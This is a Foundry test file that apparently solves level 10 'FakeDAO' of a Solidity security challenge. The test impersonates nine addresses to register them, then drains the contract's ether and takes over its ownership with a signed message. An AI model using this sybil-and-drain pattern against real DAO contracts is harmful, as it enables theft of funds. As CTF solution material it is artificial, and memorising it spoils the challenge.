// SPDX-License-Identifier: MIT
pragma solidity ^0.8.25;

import "./BaseTest.t.sol";
import "src/10_FakeDAO/FakeDAO.sol";

// forge test --match-contract FakeDAOTest -vvvv
contract FakeDAOTest is BaseTest {
    FakeDAO instance;

    function setUp() public override {
        super.setUp();

        instance = new FakeDAO{value: 0.01 ether}(address(0xDeAdBeEf));
    }

    function testExploitLevel() public {

        console.log(address(owner).balance);
        console.log(address(instance).balance);


        vm.startPrank(address(0xabcde1));
        instance.register();
        vm.startPrank(address(0xabcde2));
        instance.register();
        vm.startPrank(address(0xabcde3));
        instance.register();
        vm.startPrank(address(0xabcde4));
        instance.register();
        vm.startPrank(address(0xabcde5));
        instance.register();
        vm.startPrank(address(0xabcde6));
        instance.register();
        vm.startPrank(address(0xabcde7));
        instance.register();
        vm.startPrank(address(0xabcde8));
        instance.register();
        vm.startPrank(address(0xabcde9));
        instance.register();


        vm.startPrank(address(owner));
        instance.register();
        
        instance.voteForYourself();
        instance.withdraw();

        bytes32 salt = bytes32(0);
        bytes32 hash = keccak256(abi.encode(uint8(0x01), address(instance).balance, salt));

        (uint8 v, bytes32 r, bytes32 s) = vm.sign(ownerPrivateKey, hash);
        instance.changeDAOowner(v, r, s, salt, address(0xDeAdBeEf));

        checkSuccess();
    }

    function checkSuccess() internal view override {
        assertTrue(instance.owner() != owner, "Solution is not solving the level");
        assertTrue(address(instance).balance == 0, "Solution is not solving the level");
    }
}
